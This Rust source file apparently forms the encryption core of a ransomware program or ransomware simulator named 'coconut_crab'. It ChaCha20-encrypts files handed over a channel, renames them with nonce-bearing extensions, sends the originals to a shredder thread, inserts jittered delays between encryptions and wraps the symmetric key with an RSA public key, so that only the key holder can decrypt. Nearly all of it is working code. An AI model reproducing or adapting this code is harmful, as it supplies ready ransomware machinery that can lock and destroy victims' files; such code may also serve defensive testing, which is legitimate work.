use crossbeam_channel::{Receiver, Sender};
use hex::{decode, encode, FromHex};
use log::{debug, error, info, warn};
use purecrypto::cipher::ChaCha20;
use rand::{
    rngs::{SmallRng, StdRng},
    RngExt, SeedableRng,
};
use std::{
    fs::{self, File, OpenOptions},
    io::{Error, Read, Write},
    path::PathBuf,
    sync::{
        atomic::{AtomicU64, Ordering},
        Arc, LazyLock,
    },
    thread, time,
};

use coconut_crab_lib::file::get_file_data;

const RSA_LIMBS: usize = 32; // RSA key size in 64 bit limbs (2048 bits / 64 = 32)

const MAX_IN_MEMORY_CHACHA_SIZE_MB: u64 = 10;
const BUFFER_LEN: usize = 100 * 1024;
static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));

pub fn encrypt(
    r: Receiver<Arc<PathBuf>>,
    s: Sender<Arc<PathBuf>>,
    key: Arc<[u8; 32]>,
    counter: Arc<AtomicU64>,
    encrypted_extension: Arc<String>,
    wait_time: Arc<u32>,
    jitter_time: Arc<u32>,
) -> thread::JoinHandle<()> {
    debug!("Starting encryption crypto thread");
    thread::spawn(move || {
        let mut rng_cheap = SmallRng::from_rng(&mut rand::rng());
        debug!("Created cheap random number generator");

        loop {
            let file_path = match r.recv() {
                Ok(path) => {
                    debug!("Received file path over channel: {path:?}");
                    path
                }
                Err(error) => {
                    warn!("Error receiving file path over channel: {error}");
                    return;
                }
            };

            info!("Encrypting file: {file_path:?}");

            let nonce = counter.fetch_add(1, Ordering::Relaxed);
            debug!("Nonce value after increment: {nonce:?}");

            let mut full_nonce_bytes: [u8; 12] = [0u8; 12];
            full_nonce_bytes[0..8].copy_from_slice(&nonce.to_le_bytes());
            debug!("Nonce value after padding: {full_nonce_bytes:?}");

            let nonce_file_extension =
                format!("{}.{}", encode(full_nonce_bytes), encrypted_extension);
            debug!("Nonce extension: {nonce_file_extension}");

            let mut encrypted_file_path = file_path.as_ref().clone();

            if let Some(original_extension) = file_path.as_ref().extension() {
                debug!(
                    "File has original extension: {}",
                    original_extension.display()
                );
                encrypted_file_path.set_extension(format!(
                    "{}.{}",
                    original_extension.to_string_lossy(),
                    nonce_file_extension
                ));
            } else {
                debug!("File does not have original extension: {file_path:?}");
                encrypted_file_path.set_extension(&nonce_file_extension);
            }
            debug!("Encrypted file path: {}", encrypted_file_path.display());

            debug!(
                "Applying chacha20 with source {}, destination {}, and nonce {:?} ",
                file_path.as_ref().display(),
                encrypted_file_path.display(),
                full_nonce_bytes
            );
            match apply_chacha(
                file_path.as_ref(),
                &encrypted_file_path,
                &key,
                &full_nonce_bytes,
            ) {
                Ok(()) => {
                    debug!("Successfully applied ChaCha to data for encryption: {file_path:?}");
                    if let Err(error) = s.send(file_path.clone()) {
                        error!("Failed to send path to shredder thread: {error}");
                    }
                }
                Err(error) => {
                    error!("Failed to apply ChaCha to data for encryption: {error:?}");
                }
            }

            if *wait_time > 0 {
                let time = *wait_time - *jitter_time + rng_cheap.random_range(0..*jitter_time);
                debug!("Sleeping {time} seconds before next encryption");
                let time_duration = time::Duration::from_secs(u64::from(time));
                thread::sleep(time_duration);
                debug!("Sleeping complete");
            }
        }
    })
}

pub fn record(r: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let analysis_file_path = path.join(&*ANALYSIS_FILENAME);
        let mut analysis_file = OpenOptions::new()
            .append(true)
            .create(true)
            .open(&analysis_file_path)
            .expect("Cannot open file");

        loop {
            let file_path = match r.recv() {
                Ok(path) => {
                    debug!("Received file path over channel: {path:?}");
                    path
                }
                Err(error) => {
                    warn!("Error receiving file path over channel: {error}");
                    return;
                }
            };

            analysis_file
                .write_all(format!("{}\n", file_path.to_string_lossy()).as_bytes())
                .expect("Failed to write to file");
        }
    })
}

pub fn decrypt(r: Receiver<Arc<PathBuf>>, key: Arc<[u8; 32]>) -> thread::JoinHandle<()> {
    thread::spawn(move || loop {
        let file_path = match r.recv() {
            Ok(path) => {
                debug!("Received file path over channel: {path:?}");
                path
            }
            Err(error) => {
                warn!("Error receiving file path over channel: {error}");
                return;
            }
        };

        info!("Decrypting file: {}", file_path.display());

        let file_name_osstr = if let Some(os_str) = file_path.file_name() {
            debug!("Successfully got file name from path: {}", os_str.display());
            os_str
        } else {
            error!("File path has invalid file name: {file_path:?}");
            return;
        };

        let file_name = if let Some(name) = file_name_osstr.to_str() {
            debug!("Successfully converted file name to string: {name}");
            name
        } else {
            error!(
                "File name is not valid UTF-8: {}",
                file_name_osstr.display()
            );
            return;
        };

        let file_extensions: Vec<&str> = file_name.split('.').collect();
        let file_extensions_count = file_extensions.len();
        if file_extensions_count < 2 {
            error!("File lacks the number of extensions to decrypt: {file_extensions_count}");
            return;
        }

        let nonce_str = if let Some(segment) = file_extensions.get(file_extensions_count - 2) {
            debug!("Successfuly got nonce file extension: {segment}");
            segment
        } else {
            error!("Cannot get nonce extension: {file_extensions:?}");
            return;
        };

        let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
            Ok(nonce_bytes) => {
                debug!("Extension hex decoded: {nonce_bytes:?}");
                nonce_bytes
            }
            Err(error) => {
                error!("Extension hex could not be decoded: {error:?}");
                return;
            }
        };

        let parent_dir = if let Some(parent) = file_path.parent() {
            debug!("Successfully got parent path of file path: {file_path:?}");
            parent
        } else {
            error!("File path has invalid parent path: {file_path:?}");
            return;
        };

        let decrypted_file_name = file_extensions[..file_extensions_count - 2].join(".");
        debug!("Decrypted file name: {decrypted_file_name}");
        let decrypted_file_path = parent_dir.join(decrypted_file_name);
        debug!("Decrypted file path: {}", decrypted_file_path.display());

        match apply_chacha(
            file_path.as_ref(),
            &decrypted_file_path,
            &key,
            &full_nonce_bytes,
        ) {
            Ok(()) => {
                debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
            }
            Err(error) => {
                error!("Failed to apply ChaCha to data for decryption: {error:?}");
            }
        }
    })
}

fn apply_chacha(
    source_file_path: &PathBuf,
    destination_file_path: &PathBuf,
    key: &[u8; 32],
    full_nonce_bytes: &[u8; 12],
) -> Result<(), Error> {
    let cipher = ChaCha20::new(key);

    let source_file_data = match get_file_data(
        source_file_path,
        &(MAX_IN_MEMORY_CHACHA_SIZE_MB * 1024 * 1024),
    ) {
        Ok(data) => {
            debug!(
                "No error during file data retrieval {}",
                source_file_path.display()
            );
            data
        }
        Err(error) => {
            error!("Error during file data retrieval: {error:?}");
            return Err(error);
        }
    };

    if let Some(mut some_source_file_data) = source_file_data {
        debug!("File size is below threshold. Performing encryption with entire file in memory.");
        cipher.apply_keystream(full_nonce_bytes, 0, &mut some_source_file_data);

        match fs::write(destination_file_path, &some_source_file_data) {
            Ok(()) => {
                debug!(
                    "Successfuly wrote to file: {}",
                    destination_file_path.display()
                );
                Ok(())
            }
            Err(error) => {
                error!("Error writing to file: {error:?}");
                Err(error)
            }
        }
    } else {
        debug!("File size is above threshold. Performing encryption using buffer.");
        let mut buffer = vec![0u8; BUFFER_LEN];
        let mut bytes_read: u64 = 0;

        let mut source_file = match File::open(source_file_path) {
            Ok(file) => {
                debug!(
                    "Successfuly opened source file: {}",
                    source_file_path.display()
                );
                file
            }
            Err(error) => {
                error!("Error opening source file: {error:?}");
                return Err(error);
            }
        };

        let mut destination_file_data = match File::create(destination_file_path) {
            Ok(file) => {
                debug!(
                    "Successfully created destination file: {}",
                    destination_file_path.display()
                );
                file
            }
            Err(error) => {
                error!("Error creating destination file: {error:?}");
                return Err(error);
            }
        };

        loop {
            let read_size = match source_file.read(&mut buffer) {
                Ok(size) => {
                    debug!("Read {size} bytes to buffer");
                    size
                }
                Err(error) => {
                    error!("Error reading file to buffer: {error:?}");
                    return Err(error);
                }
            };

            if read_size == 0 {
                debug!("All bytes read from source file to buffer");
                break;
            }

            let block_num = u32::try_from(bytes_read / 64)
                .map_err(|_| Error::other("File too large for ChaCha20 (> ~256 GiB)"))?;
            cipher.apply_keystream(full_nonce_bytes, block_num, &mut buffer);
            bytes_read += BUFFER_LEN as u64;
            debug!("{bytes_read} total bytes read and encrypted");
            match destination_file_data.write_all(&buffer) {
                Ok(()) => {
                    debug!(
                        "Successfuly wrote bytes to file: {}",
                        destination_file_path.display()
                    );
                }
                Err(error) => {
                    error!("Error writing buffer to file: {error:?}");
                    return Err(error);
                }
            }
        }
        Ok(())
    }
}

pub fn encrypt_string(source: &str, key: &[u8; 32], full_nonce_bytes: &[u8; 12]) -> String {
    debug!("Encrypting string: {source}");
    let mut source_data = source.as_bytes().to_vec();
    debug!("String bytes: {source_data:?}");
    ChaCha20::new(key).apply_keystream(full_nonce_bytes, 0, &mut source_data);
    debug!("String encrypted: {:?}", encode(&source_data));
    encode(source_data)
}

pub fn decrypt_string(source_str: &str, key: &[u8; 32], nonce_str: &str) -> String {
    let mut source_data = match decode(source_str) {
        Ok(bytes) => {
            debug!("Successfully decoded hex encrypted string: {bytes:?}");
            bytes
        }
        Err(error) => {
            error!("Unable to decode hex encrypted string: {error}");
            return String::new();
        }
    };
    let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
        Ok(nonce_bytes) => {
            debug!("Successfully decoded hex nonce: {nonce_bytes:?}");
            nonce_bytes
        }
        Err(error) => {
            error!("Unable to decode hex nonce: {error}");
            return String::new();
        }
    };

    debug!("Decrypting to string: {source_data:?}");
    ChaCha20::new(key).apply_keystream(&full_nonce_bytes, 0, &mut source_data);
    debug!("String bytes: {source_data:?}");
    match String::from_utf8(source_data) {
        Ok(string) => {
            debug!("Successfully decoded bytes to string: {string}");
            string
        }
        Err(error) => {
            error!("Failed to decode bytes to string: {error}");
            String::new()
        }
    }
}

pub fn generate_sym_key(sym_key: &mut [u8; 32]) {
    debug!("Starting key generation");
    let mut rng = StdRng::from_rng(&mut rand::rng());
    rng.fill(sym_key);
    debug!("Generated symmetric key");
}

pub fn encrypt_sym_key(
    asym_pub_key: &purecrypto::rsa::RsaPublicKey<RSA_LIMBS>,
    sym_key: &[u8; 32],
) -> String {
    use purecrypto::rng::OsRng;
    let mut rng = OsRng;
    encode(
        asym_pub_key
            .encrypt_pkcs1v15(sym_key, &mut rng)
            .expect("Failed to encrypt symmetric key"),
    )
}
